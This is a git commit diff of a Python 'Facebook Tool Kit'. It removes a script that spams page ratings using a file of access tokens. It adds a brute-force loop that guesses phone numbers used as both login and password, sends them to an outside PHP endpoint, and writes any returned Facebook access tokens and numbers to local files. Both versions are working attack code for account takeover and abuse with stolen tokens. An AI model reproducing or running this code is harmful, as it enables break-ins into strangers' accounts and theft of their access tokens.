0352e04b9588820a22a4fc31a4fb337c2a245429
Ahmed Gad <34446175+xXBandoXx201@users.noreply.github.com>
2018-02-01 13:23:27 +0200

    Update Toolkit.py

--- Toolkit.py
+++ Toolkit.py
@@ -2,35 +2,34 @@
 #coding: utf-8
 #Code By : Gad
 import requests, json
+import random
+import string
+import time
 
-logo = """ 
- ______ _____ _______          _ _  ___ _   
-|  ____/ ____|__   __|        | | |/ (_) |  
-| |__ | |  __   | | ___   ___ | | ' / _| |_ 
-|  __|| | |_ |  | |/ _ \ / _ \| |  < | | __|
-| |___| |__| |  | | (_) | (_) | | . \| | |_ 
-|______\_____|  |_|\___/ \___/|_|_|\_\_|\__|   \n                                   
-                         Facebook Tool Kit By Gad\n
-https://www.facebook.com/AhmedGadga , @Gad990>>>> Telegrame
-"""
-print(logo)
-Rating = print('1.Rating FaceBook page By Token>>')
-#auto_share = print('2.Auto Share By Token>>')
-#auto_like = print('3.Auto Like By Token>>')
-#auto_follow = print('4.Auto Follow By Token>>')
-#auto_poke = print('5.Auto Poke By Token >>>>>')
-
-chosse = input('Enter Number>>')
-
-if(int(chosse)== 1):
-    id_page = input('Enter ID >>')
-    rat = input('Enter Ratting >>')
-    token = input('Enter token Folder >>')
-    var = open(token, 'r').readlines()
-    for line in var:
-        token = line.strip()
-        url = 'https://graph.facebook.com/' + id_page + '/ratings?Name=goodpagegoodpostsgoodadminsgoodpagegoodpostsgoodadmins&rating=' + rat + '&access_token=' + token + '&method=post'
-        http = requests.post(url)
-        content = http.content
-        data = json.loads(content.decode("utf-8"))
-        print(data)
+gad ="[+]Facebook Get Token By Combo [+]\n[+]Coded: @Gad990   (Telegram)[+]\n Date: 26/01/2018 \n[+]Changing the Description of this tool Won't made you the coder ^_^[+]\n[+]I take no responsibilities for the use of this program[+] "
+print(gad)
+a = 0
+while 1:
+	for x in range(0, 1000000):
+		num0 = random.choice(['011', '010', '012'])
+		num = num0 + ''.join(random.choice("0123456789" + string.digits) for _ in range(8))
+		url = 'http://ahmed-gad-for-dev-com.stackstaging.com/gad.php?u='+num+'&p='+num+''
+		http = requests.post(url)
+		content = http.content
+		data = json.loads(content.decode("utf-8"))
+		if "session_key" in data:
+				a += 1
+				print("There is ") + str(a) + " Account Work" + ', number is =  ' + num
+				path = 'access.txt'
+				access = open(path, 'a')
+				access.write(data["access_token"] + '\n')
+				access.close()
+				path1 = 'phone.txt'
+				phone = open(path1, 'a')
+				phone.write(num + '\n')
+				phone.close()
+				path2 = 'phoneandaccess.txt'
+				allv = open(path2, 'a')
+				allv.write( num + ' = ' + data["access_token"] + '\n')
+				allv.close()
+	time.sleep(0)
